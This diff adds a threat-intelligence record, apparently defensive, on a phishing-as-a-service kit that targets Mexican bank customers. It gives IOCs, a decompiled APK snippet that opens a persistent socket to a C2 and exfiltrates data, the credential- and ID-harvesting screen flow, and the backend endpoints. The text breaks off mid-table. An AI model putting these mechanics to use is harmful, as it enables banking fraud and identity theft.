@@ -1,0 +1,2063 @@
+{
+ "contacts": [
+  {
+   "account": "@panelbalonxbot",
+   "flag": "fake",
+   "service": "telegram",
+   "type": "im"
+  },
+  {
+   "account": "@BalonxSistema",
+   "flag": "fake",
+   "service": "telegram",
+   "type": "im"
+  }
+ ],
+ "countries": [
+  "MX"
+ ],
+ "createdAt": "2026-04-23T01:18:22+03:00",
+ "cveList": [],
+ "dateFirstSeen": "2025-07-28",
+ "dateLastSeen": "2026-04-22",
+ "datePublished": "2026-04-23",
+ "description": "<p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p><p style=\"margin-left:30pt;\"><strong>Classification:</strong> Confidential — Internal Use Only<br>&nbsp;<strong>Kit Name:</strong> Balonx Sistema<br>&nbsp;<strong>Type:</strong> Phishing-as-a-Service (PhaaS) — Live Phishing / Reverse Proxy<br>&nbsp;<strong>Primary Target:</strong> Banking users in Mexico<br>&nbsp;</p><h2><strong>1. Targeted Financial Institutions</strong></h2><p>The kit has hardcoded configurations and logos to impersonate the following institutions:</p><p><strong>Major Banks:</strong> BBVA, Citibanamex, Banorte, Santander, HSBC, Scotiabank, Banco Azteca, BanCoppel, BanBajío, Banregio, Inbursa, Invex, Afirme, Mifel, Banjército, Banco del Bienestar</p><p><strong>Cards and Fintechs:</strong> Liverpool, Plata Card, Spin by Oxxo, Falabella, American Express</p><h2><strong>2. Business Model (Criminal SaaS)</strong></h2><figure class=\"table\" style=\"float:left;\"><table class=\"ck-table-resized\" style=\"border-style:none;\"><colgroup><col style=\"width:50%;\"><col style=\"width:50%;\"></colgroup><tbody><tr><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\"><p style=\"text-align:center;\"><strong>Attribute</strong></p></td><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\"><p style=\"text-align:center;\"><strong>Detail</strong></p></td></tr><tr><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\"><strong>Commercial name</strong></td><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\">Balonx Sistema</td></tr><tr><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\"><strong>Model</strong></td><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\">Weekly subscription — rented to other criminals</td></tr><tr><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\"><strong>Individual Plan</strong></td><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\">3,000 MXN / week</td></tr><tr><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\"><strong>Office Plan</strong></td><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\">6,000 MXN / week (with Executive hierarchy)</td></tr><tr><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\"><strong>Payments</strong></td><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\">Crypto via Bitso API (automated verification) + manual receipt via Telegram</td></tr><tr><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\"><strong>Discount codes</strong></td><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\">discount_codes table with MXN discounts applicable at registration</td></tr><tr><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\"><strong>C2 Support</strong></td><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\">Telegram</td></tr><tr><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\"><strong>Estimated launch/relaunch date</strong></td><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\">2025-10-04 (hardcoded in source code to calculate kit age)</td></tr></tbody></table></figure><h2><strong>3. Threat Actor Identities</strong></h2><figure class=\"table\" style=\"float:left;\"><table class=\"ck-table-resized\" style=\"border-style:none;\"><colgroup><col style=\"width:50%;\"><col style=\"width:50%;\"></colgroup><tbody><tr><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\"><p style=\"text-align:center;\"><strong>Role</strong></p></td><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\"><p style=\"text-align:center;\"><strong>Identifier</strong></p></td></tr><tr><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\">Support / Sales</td><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\">@BalonxSistema /&nbsp;@balonxsistema</td></tr><tr><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\">Automated alert bot</td><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\">@panelbalonxbot (commands&nbsp;/start and&nbsp;/id)</td></tr><tr><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\">SuperAdmin (hardcoded)</td><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\">Username&nbsp;balonx and username&nbsp;brandon</td></tr></tbody></table></figure><p>The code repeatedly checks whether the logged-in user is&nbsp;\"balonx\" or&nbsp;\"brandon\" to grant global administration permissions.</p><h3><strong>3.1 Hardcoded SuperAdmin Behavior</strong></h3><ul><li><strong>balonx</strong> — Primary SuperAdmin. Full access to the panel, including exclusive sections hidden from other admins.</li><li><strong>brandon</strong> — Special hardcoded behavior: the system forces retrieval of&nbsp;<strong>saved</strong> sessions (not active) regardless of the selected tab. Suggests an audit or historical data review role.</li></ul><h2><strong>4. IOCs — Domains and Malicious Files</strong></h2><figure class=\"table\" style=\"float:left;\"><table class=\"ck-table-resized\" style=\"border-style:none;\"><colgroup><col style=\"width:50%;\"><col style=\"width:50%;\"></colgroup><tbody><tr><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\"><p style=\"text-align:center;\"><strong>Type</strong></p></td><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\"><p style=\"text-align:center;\"><strong>Value</strong></p></td></tr><tr><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\">Default C2 domain (typosquatting)</td><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\">aclaracionesditales[.]com&nbsp;<i>(missing \"g\" in \"digitales\")</i></td></tr><tr><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\">Malicious APK (Banking Trojan)</td><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\">BankProtect.apk</td></tr><tr><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\">Hardcoded APK path</td><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\">/assets/Bankprotet2_1750982122281.apk</td></tr><tr><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\">Dynamic download endpoint</td><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\">/api/get-user-apk/</td></tr><tr><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\">Telegram sales channel</td><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\">@BalonxSistema /&nbsp;t[.]me/BalonxSistema</td></tr><tr><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\">Telegram bot</td><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\">@panelbalonxbot</td></tr><tr><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\">localStorage keys</td><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\">authToken,&nbsp;2fa_verification_token</td></tr><tr><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\">C2 WebSocket path</td><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\">/ws</td></tr><tr><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\">Key endpoint</td><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\">/api/generate-link?banco=</td></tr><tr><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\">Exfiltration endpoint</td><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\">/api/upload-identity-files</td></tr><tr><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\">Anti-bot</td><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\">hxxps://js[.]hcaptcha[.]com/1/api.js&nbsp;<i>(using test key, not production)</i></td></tr></tbody></table></figure><p>&nbsp;</p><h2>&nbsp;</h2><h2>&nbsp;</h2><h2>&nbsp;</h2><h2>&nbsp;</h2><h2>&nbsp;</h2><h3><strong>4.1. APK Forensic Analysis — Bankprotet2_1750982122281.apk</strong></h3><p>This malicious file, served by the Balonx system, is identified as a commercial Android RAT based on&nbsp;<strong>Spyroid (Spyroid[.]net)</strong>.<br><br>&nbsp;</p><ul><li><strong>Analysis Tool:</strong> JADX (Android Decompiler)</li><li><strong>Package Name:</strong> sacred.explosion</li><li><strong>Main Class:</strong> bxelllolzxqfmaszk1049</li></ul><h3><strong>4.1.1 Hardcoded Configuration Fields</strong></h3><p>The APK contains the following critical fields, hardcoded and obfuscated in Base64:</p><p>&nbsp;</p><figure class=\"table\" style=\"float:left;\"><table class=\"ck-table-resized\" style=\"border-style:none;\"><colgroup><col style=\"width:25%;\"><col style=\"width:25%;\"><col style=\"width:25%;\"><col style=\"width:25%;\"></colgroup><tbody><tr><td style=\"border-color:#000000;border-width:1pt;padding:5pt;vertical-align:top;\"><strong>Field</strong></td><td style=\"border-color:#000000;border-width:1pt;padding:5pt;vertical-align:top;\"><strong>Base64 Value</strong></td><td style=\"border-color:#000000;border-width:1pt;padding:5pt;vertical-align:top;\"><strong>Decoded Value</strong></td><td style=\"border-color:#000000;border-width:1pt;padding:5pt;vertical-align:top;\"><strong>Description</strong></td></tr><tr><td style=\"border-color:#000000;border-width:1pt;padding:5pt;vertical-align:top;\"><strong>ClientHost</strong></td><td style=\"border-color:#000000;border-width:1pt;padding:5pt;vertical-align:top;\">MTk2LjI1MS44NC4xMQ==</td><td style=\"border-color:#000000;border-width:1pt;padding:5pt;vertical-align:top;\">196[.]251[.]84[.]11</td><td style=\"border-color:#000000;border-width:1pt;padding:5pt;vertical-align:top;\">C2 IP Address</td></tr><tr><td style=\"border-color:#000000;border-width:1pt;padding:5pt;vertical-align:top;\"><strong>ClientPort</strong></td><td style=\"border-color:#000000;border-width:1pt;padding:5pt;vertical-align:top;\">Nzc3MQ==</td><td style=\"border-color:#000000;border-width:1pt;padding:5pt;vertical-align:top;\">7771</td><td style=\"border-color:#000000;border-width:1pt;padding:5pt;vertical-align:top;\">C2 Port</td></tr><tr><td style=\"border-color:#000000;border-width:1pt;padding:5pt;vertical-align:top;\"><strong>CLINAME</strong></td><td style=\"border-color:#000000;border-width:1pt;padding:5pt;vertical-align:top;\">ban</td><td style=\"border-color:#000000;border-width:1pt;padding:5pt;vertical-align:top;\">N/A</td><td style=\"border-color:#000000;border-width:1pt;padding:5pt;vertical-align:top;\">Campaign/client identifier for the Spyroid panel.</td></tr><tr><td style=\"border-color:#000000;border-width:1pt;padding:5pt;vertical-align:top;\"><strong>HideType</strong></td><td style=\"border-color:#000000;border-width:1pt;padding:5pt;vertical-align:top;\">C</td><td style=\"border-color:#000000;border-width:1pt;padding:5pt;vertical-align:top;\">N/A</td><td style=\"border-color:#000000;border-width:1pt;padding:5pt;vertical-align:top;\">Controls the icon hiding mode on the victim's device.</td></tr><tr><td style=\"border-color:#000000;border-width:1pt;padding:5pt;vertical-align:top;\"><strong>ConnectionKey</strong></td><td style=\"border-color:#000000;border-width:1pt;padding:5pt;vertical-align:top;\">(long hardcoded key)</td><td style=\"border-color:#000000;border-width:1pt;padding:5pt;vertical-align:top;\">N/A</td><td style=\"border-color:#000000;border-width:1pt;padding:5pt;vertical-align:top;\">Authentication key for the C2.</td></tr></tbody></table></figure><h3>&nbsp;</h3><h3><strong>4.1.2 Reverse Shell Mechanism (sendBytes Function)</strong></h3><p>Once installed, the victim's device establishes a persistent TCP connection to the C2:</p><p>Socket socket3 =&nbsp;new&nbsp;Socket(InetAddress.getByName(C2_HOST), C2_PORT);</p><p>socket3.setSoTimeout(0);&nbsp;// No timeout — permanent connection</p><p>outputStream.write(data);&nbsp;// Real-time data exfiltration</p><p>&nbsp;</p><ul><li>setSoTimeout(0) ensures the connection never expires.</li><li>All captured data is sent in real-time to the C2.</li><li>The attacker maintains full and persistent control over the victim's Android device.</li></ul><h3><strong>C2 Infrastructure Details</strong></h3><figure class=\"table\" style=\"float:left;\"><table class=\"ck-table-resized\" style=\"border-style:none;\"><colgroup><col style=\"width:50%;\"><col style=\"width:50%;\"></colgroup><tbody><tr><td style=\"border-color:#000000;border-width:1pt;padding:5pt;vertical-align:top;\"><strong>Attribute</strong></td><td style=\"border-color:#000000;border-width:1pt;padding:5pt;vertical-align:top;\"><strong>Value</strong></td></tr><tr><td style=\"border-color:#000000;border-width:1pt;padding:5pt;vertical-align:top;\"><strong>C2 IP</strong></td><td style=\"border-color:#000000;border-width:1pt;padding:5pt;vertical-align:top;\">196[.]251[.]84[.]11</td></tr><tr><td style=\"border-color:#000000;border-width:1pt;padding:5pt;vertical-align:top;\"><strong>Port</strong></td><td style=\"border-color:#000000;border-width:1pt;padding:5pt;vertical-align:top;\">7771</td></tr><tr><td style=\"border-color:#000000;border-width:1pt;padding:5pt;vertical-align:top;\"><strong>IP Range</strong></td><td style=\"border-color:#000000;border-width:1pt;padding:5pt;vertical-align:top;\">196[.]251[.]84[.]0/24</td></tr><tr><td style=\"border-color:#000000;border-width:1pt;padding:5pt;vertical-align:top;\"><strong>ASN</strong></td><td style=\"border-color:#000000;border-width:1pt;padding:5pt;vertical-align:top;\">AS55154</td></tr><tr><td style=\"border-color:#000000;border-width:1pt;padding:5pt;vertical-align:top;\"><strong>Hosting Provider</strong></td><td style=\"border-color:#000000;border-width:1pt;padding:5pt;vertical-align:top;\">cheapy[.]host</td></tr><tr><td style=\"border-color:#000000;border-width:1pt;padding:5pt;vertical-align:top;\"><strong>Last WHOIS Modification</strong></td><td style=\"border-color:#000000;border-width:1pt;padding:5pt;vertical-align:top;\">2026-04-09 (herman.sangiwa@afrinic[.]net)</td></tr></tbody></table></figure><p>&nbsp;</p><p><strong>Note:</strong> cheapy[.]host is a low-cost hosting provider with low responsiveness to abuse reports (bulletproof-adjacent). The IP block is registered with AFRINIC (Africa), but the contact address is in Virginia Beach — a typical structure designed to complicate takedowns.</p><p>&nbsp;</p><h2><strong>5. Third-Party Infrastructure (Legitimate Services Abused)</strong></h2><figure class=\"table\" style=\"float:left;\"><table class=\"ck-table-resized\" style=\"border-style:none;\"><colgroup><col style=\"width:33.33%;\"><col style=\"width:33.33%;\"><col style=\"width:33.34%;\"></colgroup><tbody><tr><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\"><p style=\"text-align:center;\"><strong>Service</strong></p></td><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\"><p style=\"text-align:center;\"><strong>URL</strong></p></td><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\"><p style=\"text-align:center;\"><strong>Function</strong></p></td></tr><tr><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\">Bulk SMS</td><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\">hxxps://api[.]sofmex[.]mx/api/sms</td><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\">Distribution of phishing links</td></tr><tr><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\">VoIP / SIP</td><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\">central[.]voipleaders[.]net</td><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\">Vishing calls</td></tr><tr><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\">VoIP WebSocket</td><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\">wss://central[.]voipleaders[.]net:8089/ws</td><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\">Real-time voice channel</td></tr><tr><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\">IP Geolocation</td><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\">hxxps://api[.]ipify[.]org?format=json</td><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\">Victim's IP address</td></tr><tr><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\">QR Generation</td><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\">hxxps://api[.]qrserver[.]com/v1/create-qr-code/</td><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\">QR for session hijacking</td></tr><tr><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\">Anti-bot</td><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\">hxxps://js[.]hcaptcha[.]com/1/api.js</td><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\">Filter security scanners</td></tr><tr><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\">Payments</td><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\">Bitso API</td><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\">Validate affiliate subscription payments</td></tr><tr><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\">Link shortening</td><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\">Bitly API</td><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\">Shorten phishing links (bitlyLinkId,&nbsp;shortUrl)</td></tr></tbody></table></figure><p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p><h2><strong>6. Kit Capabilities — Attack Vectors</strong></h2><h3><strong>6.1. Real-Time Attack (Live Phishing)</strong></h3><p>The core of the kit is full real-time control over the victim's screen via WebSocket (/ws). This allows bypassing any type of MFA.</p><p><strong>Screens the attacker can force (SCREEN_CHANGE):</strong></p><figure class=\"table\" style=\"float:left;\"><table class=\"ck-table-resized\" style=\"border-style:none;\"><colgroup><col style=\"width:33.33%;\"><col style=\"width:33.33%;\"><col style=\"width:33.34%;\"></colgroup><tbody><tr><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\"><p style=\"text-align:center;\"><strong>#</strong></p></td><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\"><p style=\"text-align:center;\"><strong>Variable</strong></p></td><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\"><p style=\"text-align:center;\"><strong>Screen shown to victim</strong></p></td></tr><tr><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\">1</td><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\">FOLIO</td><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\">Case/claim number entry (complaint pretext)</td></tr><tr><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\">2</td><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\">VALIDANDO</td><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\">Animated loading screen with progress bar</td></tr><tr><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\">3</td><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\">LOGIN</td><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\">Banking username and password</td></tr><tr><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\">4</td><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\">CODIGO</td><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\">SMS code / MFA OTP</td></tr><tr><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\">5</td><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\">NIP</td><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\">ATM PIN</td></tr><tr><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\">6</td><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\">TARJETA</td><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\">Card number, expiration date, CVV</td></tr><tr><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\">7</td><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\">SMS_COMPRA</td><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\">Purchase authorization code (OTP for active transaction)</td></tr><tr><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\">8</td><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\">CANCELACION_RETIRO</td><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\">Cardless withdrawal code + withdrawal PIN</td></tr><tr><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\">9</td><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\">ESCANEAR_QR</td><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\">QR scan of physical card (session hijacking)</td></tr><tr><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\">10</td><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\">PROTECCION_BANCARIA</td><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\">Fake security alert inducing APK installation</td></tr><tr><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\">11</td><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\">PROTECCION_SALDO</td><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\">Captures debit and credit card balances</td></tr><tr><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\">12</td><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\">VERIFICACION_ID</td><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\">Activates camera to steal ID/Passport + Selfie (KYC bypass)</td></tr><tr><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\">13</td><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\">MENSAJE</td><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\">Free custom message</td></tr><tr><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\">14</td><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\">CANCELACION</td><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\">Cancellation/completion screen</td></tr></tbody></table></figure><h3><strong>6.2. Identity Theft — KYC Bypass</strong></h3><p>The&nbsp;VERIFICACION_ID module activates the victim's device camera to capture:</p><ul><li>Front and back of national ID (INE) or Passport</li><li>Victim selfie</li></ul><p>This data is used to bypass bank KYC systems: opening fraudulent accounts or authorizing high-risk transactions.</p><h3><strong>6.3. Malware Distribution (Not Confirmed)</strong></h3><p>In the&nbsp;PROTECCION_BANCARIA state, the page displays a fake security alert (<i>\"It is necessary to protect your balance\"</i>) and induces the victim to install&nbsp;BankProtect.apk.</p><p>The APK module allows the operator to:</p><ol><li><strong>Upload</strong> a custom APK (/api/upload-apk)</li><li><strong>Assign</strong> it to specific users (/api/assign-apk)</li><li><strong>Serve it dynamically</strong> to victims via&nbsp;/api/get-user-apk/{id}</li></ol><h3><strong>6.4. Multi-role (Fraudulent Call Center)</strong></h3><p>The \"Office\" plan includes an&nbsp;<strong>Executive</strong> hierarchy where up to 8 sub-operators can simultaneously operate multiple victim sessions, replicating the structure of a fraudulent call center.</p><h2><strong>7. Operational Hierarchy</strong></h2><p>SuperAdmin (balonx / brandon)</p><p>&nbsp;&nbsp;&nbsp;&nbsp;└── Admin (affiliated operator — Individual or Office plan)</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;└── Executive (Office plan sub-operator, max. 8)</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;└── Victim session (real-time)</p><ul><li><strong>Executives</strong> log in with an OTP sent via Telegram to the owning Admin.</li><li>Executives can view and operate victim sessions in real time but do not have access to the full admin panel.</li><li>The&nbsp;<strong>Admin</strong> controls which banks each Executive can use (allowedBanks).</li><li>Each Admin can have up to&nbsp;<strong>8 simultaneous Executives</strong>, replicating a fraudulent call center structure.</li></ul><p>&nbsp;</p><p>&nbsp;</p><h2>&nbsp;</h2><h2><strong>8. Backend Endpoints (REST API)</strong></h2><h3><strong>8.1 Criminal Authentication</strong></h3><p>POST /api/login&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; — Operator login (sends deviceId)</p><p>POST /api/register</p><p>POST /api/logout</p><p>POST /api/forgot-password</p><p>POST /api/reset-password</p><p>POST /api/verify-2fa</p><p>GET&nbsp; /api/user</p><p>GET&nbsp; /api/users</p><p>GET&nbsp; /api/users/regular</p><p>GET&nbsp; /api/admin/users</p><p>POST /api/toggle-user-status/:username</p><p>POST /api/users/cleanup-expired</p><p>PATCH /api/users/:userId/custom-price</p><h3><strong>8.2 Executive Management (Call Center)</strong></h3><p>POST &nbsp; /api/executives</p><p>PUT&nbsp; &nbsp; /api/executives/:id</p><p>DELETE /api/executives/:id</p><p>POST &nbsp; /api/executive/login</p><p>POST &nbsp; /api/executive/verify-otp</p><h3><strong>8.3 Victim Session Management</strong></h3><p>GET&nbsp; &nbsp; /api/sessions&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; — Filter by saved / current</p><p>POST &nbsp; /api/sessions/:id/save</p><p>DELETE /api/sessions/:id</p><p>DELETE /api/sessions</p><p>GET&nbsp; &nbsp; /api/generate-link?banco=:banco&nbsp; &nbsp; &nbsp; &nbsp; — Generate unique link per bank</p><p>POST &nbsp; /api/links</p><p>POST &nbsp; /api/admin/links/encargado</p><p>POST &nbsp; /api/links/:id/extend&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; — Extend link lifetime (30-min&nbsp;blocks)</p><p>POST &nbsp; /api/links/:id/cancel</p><p>GET&nbsp; &nbsp; /api/links/active-sessions</p><p>GET&nbsp; &nbsp; /api/links/history</p><h3><strong>8.4 File Exfiltration (KYC / Malware)</strong></h3><p>POST &nbsp; /api/upload-identity-files &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; — Upload ID/Passport/Selfie</p><p>POST &nbsp; /api/upload-protection-file&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; — Upload malicious APK</p><p>DELETE /api/remove-protection-file/:id</p><p>POST &nbsp; /api/upload-apk</p><p>POST &nbsp; /api/assign-apk</p><p>GET&nbsp; &nbsp; /api/get-user-apk/:id</p><h3><strong>8.5 Communication (SMS / WhatsApp / Telegram)</strong></h3><p>POST /api/sms/send</p><p>GET&nbsp; /api/sms/credits</p><p>POST /api/sms/credits/add</p><p>GET&nbsp; /api/sms/history</p><p>POST /api/telegram/send-admin-message</p><p>POST /api/telegram/send-direct-message</p><p>PUT&nbsp; /api/users/:username/chat-id</p><p>GET&nbsp; /api/whatsapp/config</p><p>POST /api/whatsapp/config</p><p>GET&nbsp; /api/whatsapp/menu</p><p>POST /api/whatsapp/menu</p><p>PUT&nbsp; /api/whatsapp/menu/:id</p><p>GET&nbsp; /api/whatsapp/status</p><p>POST /api/whatsapp/start</p><p>POST /api/whatsapp/stop</p><p>POST /api/whatsapp/send-test</p><h3><strong>8.6 Global Configuration</strong></h3><p>GET&nbsp; /api/site-config</p><p>POST /api/site-config</p><p>GET&nbsp; /api/system-config</p><p>POST /api/system-config</p><p>GET&nbsp; /api/screen-flows</p><p>PUT&nbsp; /api/screen-flows/:banco &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; — Controls screen flow per bank</p><p>GET&nbsp; /api/user-flows/:banco</p><p>POST /api/user-flows</p><p>&nbsp;</p><p><strong>8. Backend Endpoints (REST API)8.1 Criminal Authentication</strong></p><p>&nbsp;</p><figure class=\"table\" style=\"float:left;\"><table class=\"ck-table-resized\" style=\"border-style:none;\"><colgroup><col style=\"width:33.33%;\"><col style=\"width:33.33%;\"><col style=\"width:33.34%;\"></colgroup><tbody><tr><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\"><p style=\"text-align:center;\"><strong>Method</strong></p></td><td 